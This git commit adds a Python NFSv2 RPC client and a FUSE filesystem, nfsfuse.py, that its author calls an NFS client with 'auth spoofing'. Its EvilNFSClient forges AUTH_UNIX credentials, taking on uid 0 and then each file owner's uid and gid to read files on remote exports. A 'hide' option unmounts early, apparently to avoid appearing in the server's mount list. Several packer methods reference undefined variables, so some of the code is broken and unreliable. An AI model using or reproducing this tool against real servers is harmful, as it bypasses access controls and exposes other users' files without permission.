94dc7a9c0d725a1a4cd6732321b98bd38f19d85a
Daniel Miller <bonsaiviking@gmail.com>
2010-07-19 11:52:20 -0500

    Initial commit

---
+++ nfsclient.py
@@ -0,0 +1,378 @@
+# NFS RPC client -- RFC 1094
+
+# XXX This is not yet complete.
+# XXX Only GETATTR, SETTTR, LOOKUP and READDIR are supported.
+
+# (See mountclient.py for some hints on how to write RPC clients in
+# Python in general)
+
+import rpc
+import socket
+from rpc import UDPClient, TCPClient
+from mountclient import FHSIZE, MountPacker, MountUnpacker
+
+NFS_PROGRAM = 100003
+NFS_VERSION = 2
+
+# enum stat
+NFS_OK = 0
+NFSERR_PERM=1
+NFSERR_NOENT=2
+NFSERR_IO=5
+NFSERR_NXIO=6
+NFSERR_ACCES=13
+NFSERR_EXIST=17
+NFSERR_NODEV=19
+NFSERR_NOTDIR=20
+NFSERR_ISDIR=21
+NFSERR_FBIG=27
+NFSERR_NOSPC=28
+NFSERR_ROFS=30
+NFSERR_NAMETOOLONG=63
+NFSERR_NOTEMPTY=66
+NFSERR_DQUOT=69
+NFSERR_STALE=70
+NFSERR_WFLUSH=99
+
+# enum ftype
+NFNON = 0
+NFREG = 1
+NFDIR = 2
+NFBLK = 3
+NFCHR = 4
+NFLNK = 5
+
+
+class NFSPacker(MountPacker):
+
+    def pack_sattrargs(self, sa):
+        file, attributes = sa
+        self.pack_fhandle(file)
+        self.pack_sattr(attributes)
+
+    def pack_sattr(self, sa):
+        mode, uid, gid, size, atime, mtime = sa
+        self.pack_uint(mode)
+        self.pack_uint(uid)
+        self.pack_uint(gid)
+        self.pack_uint(size)
+        self.pack_timeval(atime)
+        self.pack_timeval(mtime)
+
+    def pack_diropargs(self, da):
+        dir, name = da
+        self.pack_fhandle(dir)
+        self.pack_string(name)
+
+    def pack_readdirargs(self, ra):
+        dir, cookie, count = ra
+        self.pack_fhandle(dir)
+        self.pack_uint(cookie)
+        self.pack_uint(count)
+
+    def pack_readargs(self, ra):
+        file, offset, count, totalcount = ra
+        self.pack_fhandle(file)
+        self.pack_uint(offset)
+        self.pack_uint(count)
+        self.pack_uint(totalcount)
+
+    def pack_writeargs(self, wa):
+        file, beginoffset, offset, totalcount, data = wa
+        self.pack_fhandle(file)
+        self.pack_uint(beginoffset)
+        self.pack_uint(offset)
+        self.pack_uint(totalcount)
+        self.pack_opaque(data)
+
+    def pack_createargs(self, ca):
+        dir, name, mode, uid, gid, size, atime, mtime = ca
+        self.pack_fhandle(dir)
+        self.pack_string(name)
+        self.pack_uint(mode)
+        self.pack_uint(uid)
+        self.pack_uint(gid)
+        self.pack_uint(size)
+        self.pack_timeval(atime)
+        self.pack_timeval(mtime)
+
+    def pack_renameargs(self, ra):
+        fromdir, fromname, todir, toname = da
+        self.pack_fhandle(fromdir)
+        self.pack_string(fromname)
+        self.pack_fhandle(todir)
+        self.pack_string(toname)
+
+    def pack_linkargs(self, la):
+        fromhandle, todir, toname = da
+        self.pack_fhandle(fromhandle)
+        self.pack_fhandle(todir)
+        self.pack_string(toname)
+
+    def pack_symlinkargs(self, ra):
+        fromdir, fromname, to, mode, uid, gid, size, atime, mtime = sa
+        self.pack_fhandle(fromdir)
+        self.pack_string(fromname)
+        self.pack_string(to)
+        self.pack_uint(mode)
+        self.pack_uint(uid)
+        self.pack_uint(gid)
+        self.pack_uint(size)
+        self.pack_timeval(atime)
+        self.pack_timeval(mtime)
+
+    def pack_timeval(self, tv):
+        secs, usecs = tv
+        self.pack_uint(secs)
+        self.pack_uint(usecs)
+
+
+class NFSUnpacker(MountUnpacker):
+
+    def unpack_readdirres(self):
+        status = self.unpack_enum()
+        if status == NFS_OK:
+            entries = self.unpack_list(self.unpack_entry)
+            eof = self.unpack_bool()
+            rest = (entries, eof)
+        else:
+            rest = None
+        return (status, rest)
+
+    def unpack_entry(self):
+        fileid = self.unpack_uint()
+        name = self.unpack_string()
+        cookie = self.unpack_uint()
+        return (fileid, name, cookie)
+
+    def unpack_diropres(self):
+        status = self.unpack_enum()
+        if status == NFS_OK:
+            fh = self.unpack_fhandle()
+            fa = self.unpack_fattr()
+            rest = (fh, fa)
+        else:
+            rest = None
+        return (status, rest)
+
+    def unpack_readres(self):
+        status = self.unpack_enum()
+        if status == NFS_OK:
+            fa = self.unpack_fattr()
+            data = self.unpack_opaque()
+            rest = (fa, data)
+        else:
+            rest = None
+        return (status, rest)
+
+    def unpack_attrstat(self):
+        status = self.unpack_enum()
+        if status == NFS_OK:
+            attributes = self.unpack_fattr()
+        else:
+            attributes = None
+        return status, attributes
+
+    def unpack_fattr(self):
+        type = self.unpack_enum()
+        mode = self.unpack_uint()
+        nlink = self.unpack_uint()
+        uid = self.unpack_uint()
+        gid = self.unpack_uint()
+        size = self.unpack_uint()
+        blocksize = self.unpack_uint()
+        rdev = self.unpack_uint()
+        blocks = self.unpack_uint()
+        fsid = self.unpack_uint()
+        fileid = self.unpack_uint()
+        atime = self.unpack_timeval()
+        mtime = self.unpack_timeval()
+        ctime = self.unpack_timeval()
+        return (type, mode, nlink, uid, gid, size, blocksize, \
+                rdev, blocks, fsid, fileid, atime, mtime, ctime)
+
+    def unpack_timeval(self):
+        secs = self.unpack_uint()
+        usecs = self.unpack_uint()
+        return (secs, usecs)
+
+    def unpack_readlinkres(self):
+        status = self.unpack_enum()
+        if status == NFS_OK:
+            path = self.unpack_string()
+        else:
+            path = None
+        return status, path
+
+    def unpack_statfsres(self):
+        status = self.unpack_enum()
+        if status == NFS_OK:
+            tsize = self.unpack_uint()
+            bsize = self.unpack_uint()
+            blocks = self.unpack_uint()
+            bfree = self.unpack_uint()
+            bavail = self.unpack_uint()
+            rest = ( tsize, bsize, blocks, bfree, bavail )
+        else:
+            rest = None
+        return status, rest
+
+class NFSClient(UDPClient):
+    def __init__(self, host):
+        UDPClient.__init__(self, host, NFS_PROGRAM, NFS_VERSION)
+    #def __init__(self, host):
+        #raise RuntimeError, 'Must use UDPNFSClient or TCPNFSClient'
+
+    def bindsocket(self):
+        import os
+        try:
+            uid = os.getuid()
+        except AttributeError:
+            uid = 1
+        if uid == 0:
+            port = rpc.bindresvport(self.sock, '')
+            # 'port' is not used
+        else:
+            self.sock.bind(('', 0))
+
+    def addpackers(self):
+        self.packer = NFSPacker()
+        self.unpacker = NFSUnpacker('')
+
+    def mkcred(self):
+        if self.cred is None:
+            self.cred = rpc.AUTH_UNIX, rpc.make_auth_unix_default()
+        return self.cred
+
+    def Getattr(self, fh):
+        return self.make_call(1, fh, \
+                self.packer.pack_fhandle, \
+                self.unpacker.unpack_attrstat)
+
+    def Setattr(self, sa):
+        return self.make_call(2, sa, \
+                self.packer.pack_sattrargs, \
+                self.unpacker.unpack_attrstat)
+
+    # Root() is obsolete
+
+    def Lookup(self, da):
+        return self.make_call(4, da, \
+                self.packer.pack_diropargs, \
+                self.unpacker.unpack_diropres)
+
+    def Readlink(self, fh):
+        return self.make_call(5, fh, \
+            self.packer.pack_fhandle, \
+            self.unpacker.unpack_readlinkres)
+
+    def Read(self, ra):
+        return self.make_call(6, ra, \
+            self.packer.pack_readargs, \
+            self.unpacker.unpack_readres)
+
+    # NFSPROC_WRITECACHE() "to be used in the next protocol revision"
+
+    def Write(self, wa):
+        return self.make_call(8, wa, \
+            self.packer.pack_writeargs, \
+            self.unpacker.unpack_attrstat)
+
+    def Create(self, ca):
+        return self.make_call(9, ca, \
+            self.packer.pack_createargs, \
+            self.unpacker.unpack_diropres)
+
+    def Remove(self, da):
+        return self.make_call(10, da, \
+            self.packer.pack_diropargs, \
+            self.unpacker.unpack_enum)
+
+    def Rename(self, ra):
+        return self.make_call(11, ra, \
+            self.packer.pack_renameargs, \
+            self.unpacker.unpack_enum)
+
+    def Link(self, la):
+        return self.make_call(12, la, \
+            self.packer.pack_linkargs, \
+            self.packer.unpack_enum)
+
+    def Symlink(self, sa):
+        return self.make_call(13, sa, \
+            self.packer.pack_symlinkargs, \
+            self.packer.unpack_enum)
+
+    def Mkdir(self, ca):
+        return self.make_call(14, ca, \
+            self.packer.pack_createargs, \
+            self.unpacker.unpack_diropres)
+
+    def Rmdir(self, da):
+        return self.make_call(15, da, \
+            self.packer.pack_diropargs, \
+            self.unpacker.unpack_enum)
+
+    def Readdir(self, ra):
+        return self.make_call(16, ra, \
+                self.packer.pack_readdirargs, \
+                self.unpacker.unpack_readdirres)
+
+    def Statfs(self, fh):
+        return self.make_call(17, fh, \
+            self.packer.pack_fhandle, \
+            self.unpacker.unpack_statfsres)
+
+    # Shorthand to get the entire contents of a directory
+    def Listdir(self, dir, tsize):
+        list = []
+        ra = (dir, 0, tsize)
+        while 1:
+            (status, rest) = self.Readdir(ra)
+            if status <> NFS_OK:
+                break
+            entries, eof = rest
+            last_cookie = None
+            for fileid, name, cookie in entries:
+                list.append((fileid, name))
+                last_cookie = cookie
+            if eof or last_cookie is None:
+                break
+            ra = (ra[0], last_cookie, ra[2])
+        return list
+
+class TCPNFSClient(TCPClient,NFSClient):
+    def __init__(self, host):
+        TCPClient.__init__(self, host, NFS_PROGRAM, NFS_VERSION)
+
+class UDPNFSClient(UDPClient,NFSClient):
+    def __init__(self, host):
+        UDPClient.__init__(self, host, NFS_PROGRAM, NFS_VERSION)
+
+def test():
+    import sys
+    if sys.argv[1:]: host = sys.argv[1]
+    else: host = ''
+    if sys.argv[2:]: filesys = sys.argv[2]
+    else: filesys = None
+    from mountclient import UDPMountClient, TCPMountClient
+    mcl = TCPMountClient(host)
+    if filesys is None:
+        list = mcl.Export()
+        for item in list:
+            print item
+        return
+    sf = mcl.Mnt(filesys)
+    print sf
+    fh = sf[1]
+    if fh:
+        ncl = NFSClient(host)
+        attrstat = ncl.Getattr(fh)
+        print "gotattrs\n"
+        print attrstat
+        list = ncl.Listdir(fh, 4096)
+        for item in list: print item
+        mcl.Umnt(filesys)
+
+if __name__ == '__main__':
+    test()
---
+++ nfsfuse.py
@@ -0,0 +1,329 @@
+#!/usr/bin/env python
+
+# NFS-Fuse implementation with auth-spoofing
+# by Daniel Miller
+
+import sys
+import rpc
+import fuse
+from errno import *
+from socket import gethostname
+from time import time
+from nfsclient import *
+from mountclient import TCPMountClient
+#from heapq import heappush, heappop, heappushpop
+import os
+
+fuse.fuse_python_api = (0, 2)
+
+class NFSError(Exception):
+    def __init__(self,value):
+        self.lookup = {
+            NFSERR_PERM        : EPERM,
+            NFSERR_NOENT       : ENOENT,
+            NFSERR_IO          : EIO,
+            NFSERR_NXIO        : ENXIO,
+            NFSERR_ACCES       : EACCES,
+            NFSERR_EXIST       : EEXIST,
+            NFSERR_NODEV       : ENODEV,
+            NFSERR_NOTDIR      : ENOTDIR,
+            NFSERR_ISDIR       : EISDIR,
+            NFSERR_FBIG        : EFBIG,
+            NFSERR_NOSPC       : ENOSPC,
+            NFSERR_ROFS        : EROFS,
+            NFSERR_NAMETOOLONG : ENAMETOOLONG,
+            NFSERR_NOTEMPTY    : ENOTEMPTY,
+            NFSERR_DQUOT       : EDQUOT,
+            NFSERR_STALE       : ESTALE
+        }
+        self.value = value
+    def __str__(self):
+        return repr(self.value)
+    def errno(self):
+        try:
+            err = self.lookup[self.value]
+        except KeyError:
+            raise NFSError, self.value
+        return err
+
+
+class NFSStat(fuse.Stat):
+    def __init__(self):
+        self.st_mode = 0
+        self.st_ino = 0
+        self.st_dev = 0
+        self.st_nlink = 0
+        self.st_uid = 0
+        self.st_gid = 0
+        self.st_size = 0
+        self.st_atime = 0
+        self.st_mtime = 0
+        self.st_ctime = 0
+
+class EvilNFSClient(NFSClient):
+    def mkcred(self):
+        self.cred = rpc.AUTH_UNIX, rpc.make_auth_unix(int(time()),
+            gethostname(), self.fuid, self.fgid, [])
+        return self.cred
+
+    def Listdir(self, dir, tsize):
+        list = []
+        ra = (dir, 0, tsize)
+        while 1:
+            (status, rest) = self.Readdir(ra)
+            if status <> NFS_OK:
+                raise NFSError(status)
+            entries, eof = rest
+            last_cookie = None
+            for fileid, name, cookie in entries:
+                list.append((fileid, name))
+                last_cookie = cookie
+            if eof or last_cookie is None:
+                break
+            ra = (ra[0], last_cookie, ra[2])
+        return list
+
+
+class NFSNode(object):
+    def __init__(self):
+        pass
+
+class NFSFuse(fuse.Fuse):
+    def __init__(self, *args, **kw):
+        fuse.Fuse.__init__(self, *args, **kw)
+        self.fuse_args.add("ro", True)
+        #self.handleheap = []
+        #self.handledict = weakref.WeakValueDictionary()
+
+    def main(self):
+        if hasattr(self,"server"):
+            self.host, self.path = self.server.split(':',1);
+        else:
+            raise fuse.FuseError, "No server specified"
+
+        self.mcl = TCPMountClient(self.host)
+        try:
+            status, dirhandle = self.mcl.Mnt(self.path)
+            if status <> NFS_OK:
+                raise NFSError(status)
+        except NFSError as e:
+            no = e.errno()
+            raise IOError(no, os.strerror(no), self.path)
+        if hasattr(self,"hide"):
+            self.mcl.Umnt(self.path)
+        self.rootdh = dirhandle
+        self.ncl = EvilNFSClient(self.host)
+        self.ncl.fuid = self.ncl.fgid = 0
+        status, fattr = self.ncl.Getattr(self.rootdh)
+        if status <> NFS_OK:
+            raise NFSError(status)
+        self.rootattr = fattr
+        self.ncl.fuid = self.rootattr[3]
+        self.ncl.fgid = self.rootattr[4]
+
+        status, rest = self.ncl.Statfs(self.rootdh)
+        if status <> NFS_OK:
+            return -ENOSYS
+        self.tsize = rest[0]
+        if not self.tsize:
+            self.tsize = 4096
+
+        return fuse.Fuse.main(self)
+
+    def gethandle(self, path):
+        elements = path.split("/")
+        elements = filter(lambda x: x != '', elements)
+        dh = self.rootdh
+        fattr = self.rootattr
+        self.ncl.fuid = fattr[3]
+        self.ncl.fgid = fattr[4]
+        for elem in elements:
+            status, rest = self.ncl.Lookup((dh, elem))
+            if status <> NFS_OK:
+                raise NFSError(status)
+            else:
+                dh, fattr = rest
+                self.ncl.fuid = fattr[3]
+                self.ncl.fgid = fattr[4]
+        return (dh, fattr)
+
+    #'getattr'
+    def getattr(self, path):
+        try:
+            handle, fattr = self.gethandle(path)
+        except NFSError as e:
+            no = e.errno()
+            raise IOError(no, os.strerror(no), path)
+        st = NFSStat()
+        st.st_mode, st.st_nlink, st.st_uid, st.st_gid, st.st_size \
+            = fattr[1:6]
+        st.st_atime = fattr[11][1]
+        st.st_mtime = fattr[12][1]
+        st.st_ctime = fattr[13][1]
+        return st
+
+    #'readlink'
+    def readlink(self, path):
+        if path == "/":
+            return ''
+        else:
+            try:
+                handle, fattr = self.gethandle(path)
+            except NFSError as e:
+                no = e.errno()
+                raise IOError(no, os.strerror(no), path)
+        try:
+            status, rest = self.ncl.Readlink(handle)
+            if status <> NFS_OK:
+                raise NFSError(status)
+            else:
+                return rest
+        except NFSError as e:
+            no = e.errno()
+            raise IOError(no, os.strerror(no), path)
+
+    #'readdir'
+    def readdir(self, path, offset):
+        if path == "/":
+            handle, fattr = self.rootdh, self.rootattr
+        else:
+            try:
+                handle, fattr = self.gethandle(path)
+            except NFSError as e:
+                no = e.errno()
+                raise IOError(no, os.strerror(no), path)
+        try:
+            for dir in self.ncl.Listdir(handle, self.tsize):
+                yield fuse.Direntry(dir[1])
+        except NFSError as e:
+            no = e.errno()
+            raise IOError(no, os.strerror(no), path)
+
+    #'mknod'
+    #'mkdir'
+    #'unlink'
+    #'rmdir'
+    #'symlink'
+    #'rename'
+    #'link'
+    #'chmod'
+    #'chown'
+    #'truncate'
+    #'utime'
+    #'open'
+    #'read'
+    def read(self, path, size, offset):
+        if path == "/":
+            raise IOError( EISDIR, os.strerror(EISDIR))
+        else:
+            try:
+                handle, fattr = self.gethandle(path)
+            except NFSError as e:
+                no = e.errno()
+                raise IOError(no, os.strerror(no), path)
+        try:
+            status, rest = self.ncl.Read((handle, offset, size, 0))
+            if status <> NFS_OK:
+                raise NFSError(status)
+            else:
+                fattr, data = rest
+        except NFSError as e:
+            no = e.errno()
+            raise IOError(no, os.strerror(no), path)
+        return data
+
+    #'write'
+    #'release'
+    #'statfs'
+    def statfs(self):
+        status, rest = self.ncl.Statfs(self.rootdh)
+        if status <> NFS_OK:
+            return -ENOSYS
+        st = fuse.StatVfs()
+        st.f_tsize, st.f_bsize, st.f_blocks, st.f_bfree, st.f_bavail = rest
+        return st
+
+    #'fsync'
+    #'create'
+    #'opendir'
+    #'releasedir'
+    #'fsyncdir'
+    #'flush'
+    #'fgetattr'
+    #'ftruncate'
+    #'getxattr'
+    #'listxattr'
+    #'setxattr'
+    #'removexattr'
+    #'access'
+    def access(self, path, mode):
+        try:
+            handle, fattr = self.gethandle(path)
+        except NFSError as e:
+            no = e.errno()
+            raise IOError(no, os.strerror(no), path)
+        if mode == os.F_OK:
+            return 0
+        rmode = fattr[1]
+        uid = fattr[3]
+        gid = fattr[4]
+        if uid <> 0 and gid <> 0:
+            return 0
+        elif gid <> 0:
+            if mode & os.R_OK and rmode & 044:
+                return 0
+            elif mode & os.W_OK and rmode & 022:
+                return 0
+            elif mode & os.X_OK and rmode & 011:
+                return 0
+            else:
+                raise IOError(EACCES, os.strerror(EACCES), path)
+        elif uid <> 0:
+            if mode & os.R_OK and rmode & 0404:
+                return 0
+            elif mode & os.W_OK and rmode & 0202:
+                return 0
+            elif mode & os.X_OK and rmode & 0101:
+                return 0
+            else:
+                raise IOError(EACCES, os.strerror(EACCES), path)
+        else: #uid and gid == 0
+            if mode & os.R_OK and rmode & 4:
+                return 0
+            elif mode & os.W_OK and rmode & 2:
+                return 0
+            elif mode & os.X_OK and rmode & 1:
+                return 0
+            else:
+                raise IOError(EACCES, os.strerror(EACCES), path)
+
+    #'lock'
+    #'utimens'
+    #'bmap'
+    #'fsinit'
+    #'fsdestroy'
+    def fsdestroy(self):
+        if not hasattr(self,"hide"):
+            self.mcl.Umnt(self.path)
+
+
+class NFSStatVfs(fuse.StatVfs):
+    def __init__(self, **kw):
+        self.f_tsize = 0
+        fuse.StatVfs.__init__(self, **kw)
+
+def main():
+    usage="""
+        NFSFuse: An NFS client with auth spoofing. Must be run as root.
+    """ + fuse.Fuse.fusage
+
+    server = NFSFuse(version="%prog " + fuse.__version__, \
+        usage=usage, dash_s_do='setsingle')
+    server.parser.add_option(mountopt='server',metavar='HOST:PATH', \
+        help='connect to server HOST:PATH')
+    server.parser.add_option(mountopt='hide')
+    server.parse(values=server, errex=1)
+    server.main()
+
+if __name__ == '__main__':
+    main()
